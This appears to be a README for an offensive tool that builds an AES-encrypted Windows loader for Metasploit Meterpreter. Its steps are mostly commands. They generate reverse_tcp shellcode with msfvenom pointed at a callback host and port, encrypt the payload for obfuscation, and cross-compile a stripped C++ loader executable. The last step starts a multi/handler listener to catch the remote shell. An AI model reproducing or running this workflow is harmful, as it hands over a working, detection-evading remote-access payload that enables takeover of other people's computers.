# AES-Encrypted-Reverse-TCP-Loader
Lifecycle of creating, encrypting, compiling, and deploying a Windows-based executable designed to establish a reverse TCP connection using the Metasploit Framework. The work involves shellcode generation via msfvenom, AES encryption of the payload for obfuscation, integration into a C++ loader, cross-compilation to a Windows executable.

## Workflow Overview
![Workflow Flowchart](workflow_flowchart.png)

## Steps

1. **Generate raw shellcode with msfvenom**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.103 lport=4443 -a x86 -f raw -o shellcode.bin
   ```
2. **Encrypt the payload**
   ```bash
   python encrypt_payload.py
   ```
3. **Compile the C++ loader**
   ```bash
   x86_64-w64-mingw32-g++ main.cpp -o redloader.exe -static -s
   ```
4. **Set up Metasploit listener**
   ```bash
   msfconsole
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set LHOST 192.168.10.103
   set LPORT 4443
   exploit
   ```
